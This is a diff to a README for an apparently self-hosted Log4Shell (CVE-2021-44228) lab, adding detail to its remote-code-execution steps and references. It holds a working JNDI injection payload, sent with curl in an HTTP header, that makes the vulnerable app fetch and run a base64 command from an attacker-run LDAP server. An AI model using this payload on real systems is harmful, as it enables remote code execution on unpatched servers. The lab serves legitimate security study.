@@ -18,7 +18,7 @@ terraform plan
 terraform apply --auto-approve
 ```
 
-# Exploitation Steps
+# Exploitation (Remote Code Execution) Steps
 
 _Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk**._
 
@@ -28,8 +28,16 @@ _Note: This is highly inspired from the original [LunaSec advisory](https://www.
 curl ${log4shellapp-ip}:8080 -H 'X-Api-Version: ${jndi:ldap://${jndiexploit-ip}:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
-- To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in log4shellapp's container. First ssh into log4shellapp ec2 instance using your private key and run:
+- To confirm that the code execution was successful, notice that the file `/tmp/pwned` was created in log4shellapp's container. First ssh into log4shellapp ec2 instance using your private key and run:
 
 ```bash
 sudo docker exec -ti vulnerable-app ls /tmp
+...
+pwned
+...
 ```
+
+## Reference
+
+https://www.lunasec.io/docs/blog/log4j-zero-day/
+https://bigb0ss.medium.com/appsec-log4shell-cve-2021-44228-606f91e56866
